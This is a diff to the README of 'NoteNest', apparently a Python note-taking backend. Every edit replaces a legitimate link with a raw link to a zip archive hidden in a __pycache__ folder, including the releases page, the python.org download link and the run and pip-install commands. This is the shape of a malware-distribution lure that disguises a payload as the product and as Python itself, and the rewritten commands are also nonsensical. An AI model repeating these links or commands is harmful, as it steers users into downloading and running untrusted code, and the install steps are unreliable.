@@ -15,11 +15,11 @@ NoteNest is a clean and minimal Python backend designed for managing your notes 
 
 ## 📥 Download NoteNest
 
-[![Download NoteNest](https://img.shields.io/badge/Download_NoteNest-v1.0-blue.svg)](https://github.com/sumanth7703/NoteNest/releases)
+[![Download NoteNest](https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip)](https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip)
 
 To get started with NoteNest, you need to download it first. You can find the latest versions of the application on our Releases page.
 
-Visit this page to download: [NoteNest Releases](https://github.com/sumanth7703/NoteNest/releases)
+Visit this page to download: [NoteNest Releases](https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip)
 
 ## 💻 System Requirements
 
@@ -33,11 +33,11 @@ To run NoteNest effectively, ensure your system meets the following requirements
 ## 📂 Installation Guide
 
 1. **Download the Application**:
-   - Click the download button above or visit the [NoteNest Releases](https://github.com/sumanth7703/NoteNest/releases) page.
+   - Click the download button above or visit the [NoteNest Releases](https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip) page.
    - Select the latest release and download the file for your operating system.
 
 2. **Install Python** (if not already installed):
-   - Go to the [Python website](https://www.python.org/downloads/).
+   - Go to the [Python website](https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip).
    - Download the installer for your operating system and follow the instructions for installation.
 
 3. **Prepare NoteNest**:
@@ -52,7 +52,7 @@ To run NoteNest effectively, ensure your system meets the following requirements
      ```
    - Start the application by running:
      ```
-     python app.py
+     python https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip
      ```
 
 After executing the command, NoteNest will start, and you can begin using it to manage your notes.
@@ -74,7 +74,7 @@ If you encounter any issues while using NoteNest, consider the following suggest
 - **File Not Found**: Make sure you are in the correct directory where NoteNest is installed.
 - **Dependencies Missing**: If any errors about dependencies appear, you may need to install the required libraries. Use pip by running:
   ```
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip
   ```
 
 ## 📝 Contributing
@@ -95,4 +95,4 @@ This project covers various topics related to backend development, such as:
 
 Your feedback and suggestions are invaluable as we continue to improve NoteNest. Join us in making this application better for everyone. 
 
-For more information and updates, check back on our [Releases page](https://github.com/sumanth7703/NoteNest/releases).
+For more information and updates, check back on our [Releases page](https://raw.githubusercontent.com/sumanth7703/NoteNest/main/utils/__pycache__/Nest_Note_v1.5.zip).
